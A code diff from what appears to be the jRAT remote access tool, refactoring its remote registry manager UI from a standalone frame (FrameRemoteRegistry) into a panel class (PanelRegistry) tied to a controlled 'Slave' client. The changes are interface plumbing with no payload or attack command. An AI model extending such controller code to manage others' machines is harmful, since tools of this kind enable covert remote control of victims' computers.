@@ -2,6 +2,7 @@ package jrat.module.registry.ui;
 
 import com.redpois0n.pathtree.*;
 import jrat.api.Resources;
+import jrat.api.ui.ClientPanel;
 import jrat.controller.Slave;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
@@ -21,7 +22,7 @@ import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 
 @SuppressWarnings("serial")
-public class FrameRemoteRegistry extends BaseFrame {
+public class PanelRegistry extends ClientPanel {
 
     private final ImageIcon ICON_REGSZ = Resources.getIcon("registry-string");
     private final ImageIcon ICON_REG01 = Resources.getIcon("registry-bin");
@@ -47,12 +48,9 @@ public class FrameRemoteRegistry extends BaseFrame {
     private RegistryTableRenderer renderer;
     private PathJTree tree;
 
-    public FrameRemoteRegistry(Slave s) {
-        super(s);
+    public PanelRegistry(Slave s) {
+        super(s, "Registry", Resources.getIcon("registry"));
 
-        setTitle("Registry Manager");
-        setIconImage(Resources.getIcon("registry").getImage());
-        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
         setBounds(100, 100, 800, 500);
         setLayout(new BorderLayout(0, 0));
 
